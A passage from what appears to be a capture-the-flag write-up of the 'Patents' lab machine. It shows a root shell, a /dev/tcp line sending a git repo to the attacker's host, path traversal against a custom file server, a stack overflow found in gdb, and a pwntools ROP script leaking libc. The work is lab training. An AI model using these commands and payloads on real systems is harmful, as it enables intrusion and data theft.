The Cron runs each minute, which runs `/opt/checker_client/run_file.sh`, which runs `python checker.py`. The users password looks to be passed in as an environment variable, and I can see it in the process name.

### su

The password doesn’t work for gbyolo, but it does for root:

```

www-data@04d2de4a6331:/$ su gbyolo
Password: 
su: Authentication failure
www-data@04d2de4a6331:/$ su
Password: 
root@04d2de4a6331:/#

```

And I can grab `user.txt`:

```

root@04d2de4a6331:/home/gbyolo# cat user.txt
79375f91************************

```

## Shell as root [lfm]

### Enumeration

#### Checker Client

As root in the web container, I can look at the checker application. The source for `checker.py`:

```

#!/usr/bin/env python                                                                                                                                                                                                      
import sys
import os
from utils import md5,recvline
import socket

INPUTREQ = "CHECK /{} LFM\r\nUser={}\r\nPassword={}\r\n\r\n{}\n"

if len(sys.argv) != 5:
    print "Usage: " + sys.argv[0] + " <host>:<port> <user> <pass> <file>"
    exit(-1)

HOST = sys.argv[1]
var = HOST.split(":")

if len(var) != 2:
    print "Usage: " + sys.argv[0] + " <host>:<port> <user> <pass> <file>"
    exit(-1)

try:
    PORT = int(var[1])
except ValueError:
    print "Port number must be integer"
    exit(-1)

HOST = var[0]

#print "Connecting to " + HOST + ":" + str(PORT)           

USER = sys.argv[2]

try:
    PASS = os.environ[sys.argv[3]]
except KeyError:
    print "Couldn't find such password"
    exit(-1)

FILE = sys.argv[4]

# At this point PASS is well-defined                       
base = os.path.basename(FILE)

try:
    md5sum = md5(FILE)
except IOError:
    print "File not found locally"
    exit(-1)

REALREQ = INPUTREQ.format(base, USER, PASS, md5sum)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((HOST, PORT))
s.sendall(REALREQ)
resp = s.recv(4096)
s.close()

#print resp                                                

if "LFM 200 OK" in resp:
    #print "File OK, no need to download"                  
    exit(0)

if "404" in resp:
    print "File not found on server"
    exit(-1)

#print "File corrupted, need to download it"               

REQ = "GET /{} LFM\r\n\r\n".format(base)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.sendall(REQ)
recvline(s)
recvline(s)
recvline(s)
resp = s.recv(8192)

#if resp[-1] == '\n':                                      
#    resp = resp[:-1]                                      
#                                                          
#if resp[-1] == '\r':                                      
#    resp = resp[:-1]                                      

s.close()

with open("{}.new".format(base), "wb") as f:
    f.write(resp)

print "{}.new".format(base)

```

And `run_file.sh`:

```

#!/bin/bash                                                
                                                           
echo $(date) > /opt/checker_runned                         
                                                           
FOLDER=/var/www/html/docx2pdf                              
FILE=/var/www/html/docx2pdf/convert.php                    
                                                           
#export PASSWORD="!gby0l0r0ck\$\$!"                        
                                                           
NEWFILE=$(python checker.py 10.100.0.1:8888 lfmserver_user PASSWORD $FILE)                                             

#echo "Res: $NEWFILE"                                      
#exit                                                      
if [ -z $NEWFILE ]; then                                   
    echo "File not corrupted."                             
    exit                                                   
fi                                                         

if [ -f $NEWFILE ]; then                                   
   echo "File corrupted. Copying new file..."              
   cp $NEWFILE $FILE                                       
   if [ $? -ne 0 ]; then                                   
       echo "Couldn't restore file"                        
   else                                                    
       echo "File restored successfully"                   
       rm -f $NEWFILE                                      
   fi                                                      
else                                                       
   echo "File not corrupted. Not doing anything"           
fi 

```

So the Bash script calls `checker.py`, passing in the IP address (likely the host machine given the .1) and port, the username, the environment variable that holds the password, and the file, which in this case is `convert.php`.

The Python script seems to be a client for this file manager system. Just looking at the Bash script, I can see that it returns nothing if the hashes match, or a new filename (and presumably a file) if not. The logic in the Bash script is that if the length of the output is 0 (`-z`), it prints that the file is good and exits. Else, assuming the output is an existing regular file (`-f`), it copies that over the original file.

Looking at `checker.py`, it:
1. Collects all the arguments, checking that it has them all correctly formatted.
2. Creates a request string of using the template: `"CHECK /{} LFM\r\nUser={}\r\nPassword={}\r\n\r\n{}\n"`. The variables are the filename (without path), username, password, and md5 hash of the file. This format looks like HTTP, in that it starts with a verb (`CHECK`), a path, and a protocol (`LFM`), then some headeders on their own lines. Then there’s a double line break, and the body of the message, in this case, the hash.
3. Sends the request string.
4. If the response includes “LFM 200 OK”, the files match, and it exists with success status.
5. If the response includes “404” in the response, it prints that the file is not found on the server, and exits with error status.
6. Continuing, the file must have been on the server, but had a hash mismatch. It now builds another request string from the template: `"GET /{} LFM\r\n\r\n"`. The only variable is the filename.
7. Sends the request string.
8. Writes the response into a file with the same filename as the passed in file but with `.new` appended in the local directory.
9. Prints that `.new` filename.

#### Extract Git Repo

After failing a lot of different command injections, I did some additional enumeration, and stumbled upon the folder `/usr/src/lfm`. It is empty other than a `.git` folder:

```

root@04d2de4a6331:/usr/src/lfm# ls -la
total 12
drwx------ 1 root   root   4096 Dec  3 13:07 .
drwxr-xr-x 1 root   root   4096 Dec  3 13:07 ..
drwx------ 1 gbyolo gbyolo 4096 Dec  3 13:07 .git

```

I’ll grab that folder and bring it back to my workstation:

```

root@04d2de4a6331:/usr/src# tar -zcf /tmp/lfm.tar.gz lfm/
root@04d2de4a6331:/usr/src# ls -l /tmp/lfm.tar.gz 
-rw-r--r-- 1 root root 90454 Feb 19 11:51 /tmp/lfm.tar.gz
root@c3470ffa958b:/usr/src# cat /tmp/lfm.tar.gz > /dev/tcp/10.10.14.30/443
root@c3470ffa958b:/usr/src# md5sum /tmp/lfm.tar.gz                        
5f7f1fc9db887e1ceebbb83599e48464  /tmp/lfm.tar.gz

```

Locally:

```

root@kali# nc -lnvp 443 > lfm.tar.gz
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.173.
Ncat: Connection from 10.10.10.173:33966.
root@kali# md5sum lfm.tar.gz 
5f7f1fc9db887e1ceebbb83599e48464  lfm.tar.gz

```

#### Explore Git Repo

The current state of the git repo has no files. But there’s a number of commits I can look back through:

```

root@kali# git log --pretty=oneline
7c6609240f414a2cb8af00f75fdc7cfbf04755f5 (HEAD -> master) Removed meow files. THIS REPOSITORY IS ON SVN
a900ccf7ae75b95db5f2d134d80e359a795e0cc6 Added last executable and README
aa139d6caea2182c73341919150d9f5cd05e7468 Switched to SVN for repository hosting. This will be empty
1bbc518518cdde0126103cd4c6e7e6dfcdd36d3e Added README
027b01782f86a67a2b17787d9a5dea0eb4a803a3 Added LFM protocol management
0ac7c940010ebb22f7fbedb67ecdf67540728123 Added main file
b010219da4a5f515ed0a5208cdd259c2f4a07f8e Added process and thread management
35f32dd1d6b6da084cfc8b6cd9e24cd3f1d05663 Added files to serve
b2043a2c470abbe945b719be7e007d367a2a5f05 Started implementinf LFM interface
cfbbad867b611b0cc3544a24a4cd877bae5f1733 Implemented interface of lfm protocol
9a512f08a2e7cabab2a821db0a18685b2b95deb6 Added makefile
7d29513b0105996a0c29b4eed9b3554983b804b7 Added log parsing
527274134f86457bb17ea77909e2e6977523837b Initialized project

```

If I step back one commit, there’s a `README.md` and a stripped 64-bit elf executable:

```

root@kali# git checkout a900ccf7ae75b95db5f2d134d80e359a795e0cc6
HEAD is now at a900ccf Added last executable and README

root@kali# ls -l
total 40
-rwxrwx--- 1 ﻿root vboxsf 35552 Feb 20 17:44 lfmserver
-rwxrwx--- 1 ﻿root vboxsf   624 Feb 20 17:44 README

root@kali# file lfmserver 
lfmserver: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=ec26f8b03b404f2a65bde692676e75e7ff538231, stripped

```

The `README.md` contains information about the binary:

```

lfmserver' dynamic libraries:
        linux-vdso.so.1 (0x00007ffda19f0000)
        libm.so.6 => /lib/x86_64-linux-gnu/libm.so.6 (0x00007f5444090000)
        libcrypto.so.1.1 => /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1 (0x00007f5443dc5000)
        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f5443da4000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5443bba000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f5444226000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f5443bb4000)

NB: lfmserver was compiled against:
- libc6: 2.28-0ubuntu1
- libssl1.1: 1.1.1-1ubuntu2.1

```

Three commits back I’ll find a lot of the source, and a conf file:

```

root@kali# git checkout 1bbc518518cdde0126103cd4c6e7e6dfcdd36d3e
Previous HEAD position was aa139d6 Switched to SVN for repository hosting. This will be empty
HEAD is now at 1bbc518 Added README

root@kali# ls
arg_parsing.c  file.c  files  lfm.h        lfmserver.conf  log.c  Makefile  md5.h             params_parsing.h  process.h  socket_io.c  thread.c
arg_parsing.h  file.h  lfm.c  lfmserver.c  lfmserver.h     log.h  md5.c     params_parsing.c  process.c         README     socket_io.h  thread.h

```

I’ll grab copies of all this source. As I continue backwackwards, the source gets less and less, which makes sense. There is also a different `README`, which talks about the protocol, which lines up with what I’ve seen so far:

```

This is an implementation of the Lightweight File Manager LFM Protocol.
It's a pre-fork and pre-thread server, which supports re-forking and re-threading
when the number of child processes of threads goes below a threshold.

It's similar to HTTP, and supports the following methods:

GET /object LFM     [\r\n]
User=user           [\r\n]
Password=password   [\r\n]
                    [\r\n]

CHECK /object LFM   [\r\n]
User=user           [\r\n]
Password=password   [\r\n]
                    [\r\n]
md5_of_the_file     [\r\n]
                    [\r\n]

PUT /object LFM     [\r\n]
User=user           [\r\n]
Password=password   [\r\n] 
                    [\r\n]
bytes_of_the_file   

Communication is based on TCP. 
Default port is 5000.

A configuration file is placed in /etc/lfmserver/lfmserver.conf, where you can
configure thresholds, number of processes, number of threads, ...

```

The `lfmserver.conf` file also is there now:

```

NumberOfChildren=4
NumberOfThreadsPerProcess=1
MaxNumberOfThreadsPerProcess=5
PercentageOfDeadChildren=0.2
Port=5000

```

#### Protections

Since I have a binary, it’s worth checking what protections are in place:

```

root@kali# checksec lfmserver
[*] '~/hackthebox/patents-10.10.10.173/lfmserver'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

Luckily for me, I don’t have to deal with PIE or canaries. I don’t have a shell on the target server to check, but fair to assume ASLR is enabled, so I’ll assume to build an exploit I need to leak an address.

### Run lfmserver

For this part, I took good advantage of `tmux` to have panes with different aspects, such as the server running, `nc` to send requests, `tail -f lfmserver.log` to see the log in real time, and another , which just prints new results as they are written:

[![Terminal Window](https://0xdfimages.gitlab.io/img/image-20200221063410869.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200221063410869.png)

The commands in the picture above will make more sense as I walk through them now. That image is just to show how I had it set up.

Next I just tried to run `lfmserver`. I started it `./lfmserver`, and it just hung. It did create a file, `lfmserver.log`:

```

lfmserver[12082]: Unable to find configuration file /etc/cserver/cserver.conf, using default configuration
lfmserver[12082]: Server starting on port 5000. Logfile = lfmserver.log
Number of children: 4
lfmserver[12082]: perc_dead_child: 0.200000
lfmserver[12082]: socket created (fd=5) 
lfmserver[12082]: socket bind() OK
lfmserver[12082]: listen() went ok. BACKLOG=128
lfmserver[12084]: N_THREAD: 1, MAX_THREADS: 5
lfmserver[12085]: N_THREAD: 1, MAX_THREADS: 5
lfmserver[12086]: N_THREAD: 1, MAX_THREADS: 5
lfmserver[12083]: N_THREAD: 1, MAX_THREADS: 5

```

I played with `nc` connecting trying to replicate what I know about the protocol. On my third connect, I got it right, though it still 404ed. The terminal below shows first the command just printed, and then the same command piped into `nc localhost 5000`:

```

root@kali# echo -e 'CHECK /notafile LFM\r\nUser=lfmserver_user\r\nPassword=!gby0l0r0ck$$!\r\n\r\n01234567890123456789012345678901\n'
CHECK /notafile LFM
User=lfmserver_user
Password=!gby0l0r0ck$$!

01234567890123456789012345678901

root@kali# echo -e 'CHECK /notafile LFM\r\nUser=lfmserver_user\r\nPassword=!gby0l0r0ck$$!\r\n\r\n01234567890123456789012345678901\n' | nc localhost 5000
LFM 404 NOT FOUND

Ncat: Connection reset by peer.

```

The log showed those connections:

```

lfmserver[12084]: Client connected: IP = 127.0.0.1
lfmserver[12085]: Client connected: IP = 127.0.0.1
lfmserver[12086]: Client connected: IP = 127.0.0.1
lfmserver[12086]: 404 NOT FOUND: ./files/notafile
lfmserver[12086]: file does not exist [HEAD]
lfmserver[12082]: One child is dead
lfmserver[12082]: Re-forking 1 processes
lfmserver[12133]: N_THREAD: 1, MAX_THREADS: 5

```

It’s interesting to know that it looks in `./files/{path}` for the file. Can I traverse directories? My first attempt just results in a “One child is dead” message in the log:

```

root@kali# echo -e 'CHECK /../../../../../../../etc/passwd LFM\r\nUser=lfmserver_user\r\nPassword=!gby0l0r0ck$$!\r\n\r\n01234567890123456789012345678901\n' | nc localhost 5000
Ncat: Connection reset by peer.

```

But then I tried url-encoding it, and it failed differently:

```

root@kali# echo -e 'CHECK /%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd LFM\r\nUser=lfmserver_user\r\nPassword=!gby0l0r0ck$$!\r\n\r\n012345678901234567890123
45678901\n' | nc localhost 5000
LFM 404 NOT FOUND

Ncat: Connection reset by peer.

```

The logs showed:

```

lfmserver[12133]: Client connected: IP = 127.0.0.1
lfmserver[12133]: 404 NOT FOUND: ./files/../../../../../../../etc/passwd
lfmserver[12133]: file does not exist [HEAD]

```

Of course, I don’t have a `./files` directory. After creating that and re-running, I get:

```

root@kali# echo -e 'CHECK /%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd LFM\r\nUser=lfmserver_user\r\nPassword=!gby0l0r0ck$$!\r\n\r\n01234567890123456789012345678901\n' | nc localhost 5000
LFM 406 MD5 NOT MATCH
Ncat: Connection reset by peer.

```

And the log:

```

lfmserver[12238]: Client connected: IP = 127.0.0.1
lfmserver[12238]: 406 MD5 NOT MATCH: ./files/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd

```

I can find the actually md5 of my `/etc/passwd`, and submit it:

```

root@kali# md5sum /etc/passwd
4dce37d42e330b41b9bbc3352f1ea0e3  /etc/passwd

root@kali# echo -e 'CHECK /%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd LFM\r\nUser=lfmserver_user\r\nPassword=!gby0l0r0ck$$!\r\n\r\n4dce37d42e330b41b9bbc3352f1ea0e3\n' | nc localhost 5000
LFM 200 OK
Size: 32

4dce37d42e330b41b9bbc3352f1ea0e3
Ncat: Connection reset by peer.

```

I got a match! The log only shows the connection:

```

lfmserver[12307]: Client connected: IP = 127.0.0.1

```

### Static Analysis

#### Source Code Analysis

There’s a lot of code here. The main function starts in `lfmserver.c`, with a lot of the protocol functionality defined in `lfm.c`. One thing I noticed right away is that many of the functions in `lfm.c` were just comments for doing later. For example:

```

...[snip]...
void url_decode(char* src, char* dest, int max) {
    // TODO: implement
}
...[snip]...
int handle_check(struct msg *message)
{
    // TODO: implement

        send_401(message->connsd);
        return -1;
}

int handle_get(struct msg *message)
{       
    // TODO: implement
    //
        send_bad_request(message->connsd);
    return 0;
}    
...[snip]...
int handle_put(struct msg *message, struct params_configuration *param, size_t max_size)
{
    char *ok_header = "LFM 200 OK\r\n";
    //char fileToPut[MAX_FILENAME_SIZE];

    // handle authentication (TODO REFACTOR)
    if (message->user != NULL && message->pass != NULL){
                if (strcmp(message->user, param->authorized_user) == 0 &&
                        strcmp(message->pass, param->authorized_pass) == 0) {

                if (send_header(ok_header, message) == -1) {
                        return -1;
                }

            // TODO: implement

            max_size = max_size; // AVOID WARNING 
            return 0;
        }
    }

        send_401(message->connsd);
        return -1;
}
...[snip]...

```

I suspect those have been implemented in the binary. So I will rely on the code only for a guide while looking at the Ghidra output.

#### Ghidra Decompile

To orient myself in Ghidra, I first looked at strings (Search -> For Strings…). I found “CHECK”, which I recognized from the protocol, and then used the source, `lfm.c` to update the variable names. I even created the struct for `msg`, which was not totally necessary, but interesting to play with:

[![msg struct in Ghidra](https://0xdfimages.gitlab.io/img/image-20200222162727612.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200222162727612.png)

I spent a fair amount of time just labeling the decompile to get close to the source, looking for differences. I’m sure that wasn’t necessary, but I found it useful to get a feel for the code, and get more comfort with Ghidra.

#### General Structure

Between the source and the Ghidra output, I got a feel for the program. There’s a lot of work done here to handle threading, etc. But working backwards from some interesting functions to main, it goes:

`main` listens and for connections, then passes to `spawn_chlidren` (with children misspelled like that). `spawn_chlidren` forks `n` times, each time calling `child_work`, which actually accepts the connection, and starts new threads passing the socket to `create_new_thread`. `create_new_thread` creates the thread, with the function `thread_work`, which after some more handling of the threading, calls `handle_lfm_connection`. I kind of skimmed through all of this setup code up to this point. There could be a vulnerability in there, but if so, it’s going to be difficult to spot, and I wanted to understand how a single request was handled first.

`handle_lfm_connection` calls `read_message` on the connection to get a `msg` object, which it then passes to either `handle_check`, `handle_get`, or `handle_put` based on `message->method`:

```

int handle_lfm_connection(int connsd, char *ip)
{
    struct msg *message;

    char *client_ip = strndup(ip, INET_ADDRSTRLEN+1);
    free(ip);

    if ((message=read_message(connsd)) == NULL) {
        return -1;
    }
    message->client_ip = client_ip;

    if (message->method == CHECK) {
        handle_check(message);
    } else if (message->method == GET) {
        handle_get(message);
    } else if (message->method == PUT) {
        handle_put(message, &param_config, MAX_OBJECT_SIZE);
    }

    free_object(message);
    free_message(message);
    free_struct(message);

    return 1;
}

```

All three of these functions have `TODO` markings in the latest source I have.

#### handle\_put

Thinking of HTB as a game, the vulnerable code is likely to be in the part I have to RE because the source is missing.

My first thought on skimming the code was that there was a PUT function, and perhaps I could abuse that to write a file on Patents.

The source for this function does have a little structure:

```

int handle_put(struct msg *message, struct params_configuration *param, size_t max_size)
{
    char *ok_header = "LFM 200 OK\r\n";
    //char fileToPut[MAX_FILENAME_SIZE];

    // handle authentication (TODO REFACTOR)
    if (message->user != NULL && message->pass != NULL){
        if (strcmp(message->user, param->authorized_user) == 0 &&
            strcmp(message->pass, param->authorized_pass) == 0) {

            if (send_header(ok_header, message) == -1) {
                return -1;
            }

            // TODO: implement

            max_size = max_size; // AVOID WARNING 
            return 0;
        }
    }

    send_401(message->connsd);
    return -1;
}

```

When I filled out the decompile, I see it’s not that different:

```

int FUN_handle_put(msg *message,params_configuration *param)

{
  int int_result;
  
  if ((((message->user != (char *)0x0) && (message->pass != (char *)0x0)) &&
      (int_result = strcmp(message->user,*(char **)((long)&param->authorized_user + 4)),
      int_result == 0)) &&
     (int_result = strcmp(message->pass,*(char **)((long)&param->authorized_pass + 4)),
     int_result == 0)) {
    int_result = FUN_send_header(ok_header,message,message);
    if (int_result == -1) {
      return -1;
    }
    return 0;
  }
  FUN_send_401((ulong)(uint)message->connsd);
  return -1;
}

```

It seems that in the binary I have, PUT isn’t implemented to actually put anything, perhaps still to do later.

#### handle\_check

`handle_check` isn’t implemented at all in the source:

```

int handle_check(struct msg *message)
{   
    // TODO: implement
    
    send_401(message->connsd);
    return -1;
}

```

Looking in Ghidra, I get decompiled code. In addition to renaming / retyping some of the variables, I also removed some garbage lines that Ghidra added. They were here but not present in the disassembly, and I can’t explain what they were doing there. They typically looked like `local_c0 = (char *)0x403b30;`.

```

int FUN_handle_check(msg *message)

{
  msg **output_str_copy;
  char *md5_copy;
  int int_result;
  size_t encoded_object_len;
  ulong output_str_size;
  msg *msg_on_stack;
  char object_decoded [128];
  msg **output_str;
  int cmp_result;
  char *object;
  char *md5;
  
  msg_on_stack = message;
  if ((message->user != (char *)0x0) && (message->pass != (char *)0x0)) {
    int_result = strcmp(message->user,authorized_user);
    if (int_result == 0) {
      int_result = strcmp(msg_on_stack->pass,authorized_pass);
      if (int_result == 0) {
        encoded_object_len = strlen(msg_on_stack->object);
        FUN_url_decode(msg_on_stack->object,object_decoded,(int)encoded_object_len + 1);
        int_result = access(object_decoded,4);
        if (int_result == -1) {
          FUN_system_log(6,"404 NOT FOUND: %s\n",object_decoded);
          FUN_send_404(msg_on_stack->connsd);
          (*DAT_00409430)((ulong)(uint)msg_on_stack->connsd,"file does not exist [HEAD]",0, (ulong)(uint)msg_on_stack->connsd);
          return -1;
        }
        md5 = FUN_md5sum(object_decoded);
        if (md5 == (char *)0x0) {
          FUN_send_500(msg_on_stack->connsd);
          return -1;
        }
        object = msg_on_stack->object;
        msg_on_stack->object = (char *)0x0;                                    
        cmp_result = strcmp(md5,msg_on_stack->body);
        if (cmp_result != 0) {
          FUN_system_log(6,"406 MD5 NOT MATCH: %s\n",object);
          FUN_00402f8f((ulong)(uint)msg_on_stack->connsd,md5,md5);
          return -1;
        }
        int_result = FUN_send_header(ok_header,msg_on_stack,msg_on_stack);
        if (int_result == -1) {
          return -1;
        }
        md5_len = strlen(md5);  // same variable as encoded_object_len, renamed for readability
        md5_copy = md5;
        output_str_size = (md5_len + 0x1c) / 0x10;
        output_str = &msg_on_stack + output_str_size * 0x1ffffffffffffffe;
        md5_len = strlen(md5_copy);
        md5_copy = md5;
        output_str_copy = output_str;
        snprintf((char *)output_str_copy,md5_len + 4,"%s\r\n\r\n",md5_copy);
        output_str_copy = output_str;
        output_str_len = strlen(output_str_copy); // same variable used again
        output_str_copy = output_str;
        socket = msg_on_stack->connsd;  //int_result variable reused, renamed for readability
        int_result = FUN_write_message(socket,output_str_copy,output_str_len);
        if (int_result == -1) {
          FUN_log_info("Couldn\'t send md5sum [handle_check]");
          return -1;
        }
        return 0;
      }
    }
  }
  FUN_send_401((uint)msg_on_stack->connsd);
  return -1;
}

```

This function does what I expect the `CHECK` method to do:
1. Checks that the username and password are not null, and that they match the configuration values. If not, returns 401.
2. Url-decodes the object (the file path).
3. Checks that the file exists. If not, returns 404.
4. Calculates the MD5. If this fails for some reason, returns 500.
5. Compares the calculated MD5 with the body of the message. If they don’t match, returns `406 MD5 NOT MATCH`.
6. Creates space at the top of the stack for a success message that includes 200 OK, the size of the hash, and the hash itself. Returns this message.

#### url\_decode

Before I move on to create the exploit, I’m going to look at the `url_decode` function, as I’ll need it in a minute. It was not implemented in the source, but the decompilation is pretty straight forward:

```

void FUN_url_decode(char *src,char *dest,int max)

{
  ulong ord;
  int char_remain;
  char *dest_local;
  undefined2 hex;
  undefined i;
  undefined2 *src_ptr;
  
  i = 0;
  char_remain = max;
  dest_local = dest;
  src_ptr = (undefined2 *)src;
  while ((*(char *)src_ptr != '\0' && (char_remain = char_remain + -1, char_remain != 0))) {
    if (*(char *)src_ptr == '%') {
      src_ptr = (undefined2 *)((long)src_ptr + 1);
      hex = *src_ptr;
      ord = strtoul((char *)&hex,(char **)0x0,0x10);
      *dest_local = (char)ord;
      dest_local = dest_local + 1;
      src_ptr = src_ptr + 1;
    }
    else {
      *dest_local = *(char *)src_ptr;
      dest_local = dest_local + 1;
      src_ptr = (undefined2 *)((long)src_ptr + 1);
    }
  }
  *dest_local = '\0';
  return;
}

```

It walks through the input string characters by character, and if the current character is a `%`, it moves forward one byte and calls `strtoul` (string to unsigned long) with a base 16 to convert the following hex to a number.

So for a string like `%41%42`, it will start at 0, see the `%`, increment the pointer to 1, then call `strtoul("41", 0, 0x10)`, which returns 0x41, which is `A`. Then it increments the pointer by the size of a long (two bytes) to 3, and continues. I will abuse this later, because of how `strtoul` works. According to [docs](http://www.cplusplus.com/reference/cstdlib/strtoul/):

> Return Value
>
> On success, the function returns the converted integral number as an `unsigned long int` value.
> If no valid conversion could be performed, a zero value is returned.

The trick is that I can send `%` and then two non-hex characters, and `strtoul` will return 0, which I can use to terminate a string.

### Exploit

#### Identify Buffer Overflow

Right away I noticed that the `url_decode` function was being passed an output buffer that was a local argument, therefore on the stack, that was a `char [128]`. Because I’m too lazy to go find the code that parses the object, I just fired up `gdb`, put a break point at the call to `url_decode`, and then let it run.

```

root@kali# gdb -q lfmserver
Reading symbols from lfmserver...
(No debugging symbols found in lfmserver)
gdb-peda$ b *0x403b8d                                                    
Breakpoint 1 at 0x403b8d                                
gdb-peda$ r
Starting program: /media/sf_CTFs/hackthebox/patents-10.10.10.173/lfmserver 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Attaching after Thread 0x7ffff79884c0 (LWP 15085) fork to child process 15089]
[New inferior 2 (process 15089)] 
[Detaching after fork from parent process 15085]
[Inferior 1 (process 15085) detached]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff7972700 (LWP 15096)]

```

Then I added a bunch of a characters to the end of my path and sent a request with `nc`:

```

root@kali# echo -e 'CHECK /%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwdaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa LFM\r\nUser=lfmserver_user\r\nPassword=!gby0l0r0ck$$!\r\n\r\n0e4fc88d747a3e566ba4ac9462c827f8\n' | nc localhost 5000 

```

It hit my breakpoint just before `url_decode` is going to be called on `msg->object`. I can take a look at the return address:

```

gdb-peda$ bt
#0  0x0000000000403b8d in ?? ()  // current address
#1  0x000000000040401a in ?? ()  // next return address
#2  0x0000000000405035 in ?? ()
#3  0x00007ffff7b56fb7 in start_thread (arg=<optimized out>) at pthread_create.c:486
#4  0x00007ffff7a882cf in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:95

gdb-peda$ x/4xg $rbp
0x7ffff7971e70: 0x00007ffff7971ea0      0x000000000040401a
0x7ffff7971e80: 0x00007ffff0000b20      0x0000000600404df5

```

I can see that $rbp+4 matches the return address from `bt`. If I step once, I can see the address is overwritten:

```

gdb-peda$ x/4xg $rbp
0x7ffff7971e70: 0x6161616161616161      0x6161616161616161
0x7ffff7971e80: 0x6161616161616161      0x6161616161616161

```

That’s a buffer overflow.

With a bit of tinkering, I can get the string to overwrite the return address exactly with spacing of 160:

```

root@kali# python -c 'print("CHECK /" + "a"*160 + "A"*8 + " LFM\r\nUser=lfmserver_user\r\nPassword=!gby0l0r0ck$$!\r\n\r\n0e4fc88d747a3e566ba4ac9462c827f8")' | nc 127.0.0.1 5000

```

I could have used `pattern_create`, but I just looked at the memory in gdb and saw by how much I needed to adjust the input.

#### Stage 1: Leak libc

I’ll need some ROP gadgets, which I can generate in `gdb` with the command `rop`:

```

gdb-peda$ rop
Gadgets information
============================================================  
...[snip]...
0x0000000000405c4b : pop rdi ; ret
0x0000000000405c49 : pop rsi ; pop r15 ; ret
...[snip]...

```

Now I’ll start my pwn script:

```

#!/usr/bin/env python3

import urllib.parse
from pwn import *

if len(sys.argv) != 2 or sys.argv[1] not in ['local','remote']:
    print(f"Usage: {sys.argv[0]} [target]\n  target is local or remote\n")
    sys.exit(1)
target = sys.argv[1]

### Context
lfmserver = ELF('./lfmserver')
if target == 'local':
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    ip = '127.0.0.1'
    port = 5000
else:
    #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    ip = '10.10.10.173'
    port = 8888
sock_fd = 6

### Gadgets and payload template
pop_rdi     = p64(0x0000000000405c4b)
pop_rsi_r15 = p64(0x0000000000405c49)
payload = "CHECK /%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd%xx" + "a"*125 + "{}          LFM\r\nUser=lfmserver_user\r\nPassword=!gby0l0r0ck$$!\r\n\r\n"

```

So far, this code just sets up things I’ll need to each of the stages.

Next, leaking a libc address. I’ll arbitrarily select the `socket` function to leak, and since I know my libc version, I can find the offset from `socket` to the base:

```

### Stage 1: libc leak
rop = pop_rdi + p64(sock_fd) + pop_rsi_r15 + p64(lfmserver.got['socket']) + p64(0) + p64(lfmserver.plt['write'])

p = remote(ip, port)
p.sendline(payload.format(urllib.parse.quote(rop)))
data = p.recvall()
socket_addr = u64(data.split(b'\n')[1][:8].ljust(8, b"\x00"))
log.info(f"Found socket address:          0x{socket_addr:016x}")
libc_base_addr = socket_addr - libc.symbols['socket']
log.info(f"Calculated libc base address:  0x{libc_base_addr:016x}")

```

The rop will first pop the socket descriptor into RDI, then pop the GOT address for `socket` into RSI (and null into R15). Then it will call `write`, which effectively calls `write(socket_fd, socket_got_addr)`. Next the script receives the write and parses out the address. It prints the address, as well as the calculated address for later.

This works locally:

```

root@kali# python3 pwn_patents_root.py local
[*] '/media/sf_CTFs/hackthebox/patents-10.10.10.173/lfmserver'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 127.0.0.1 on port 5000: Done
[+] Receiving all data: Done (46B)
[*] Closed connection to 127.0.0.1 port 5000
[*] Found socket address:          0x00007f1b520d78d0
[*] Calculated libc base address:  0x00007f1b51fdc000

```

When I run this on Patents, I get a `socket` address ending in `3e0`:

```

[*] Found socket address:          0x00007f69d43783e0

```

I can use [libc-database](https://github.com/niklasb/libc-database) to find the libc binary running on Patents:

```

root@kali:/opt/libc-database# ./find socket 3e0
archive-old-glibc (id libc6_2.19-10ubuntu2_i386)
archive-old-glibc (id libc6_2.28-0ubuntu1_amd64)

```

I know it’s the second one because it’s 64-bit code.

#### Strategy

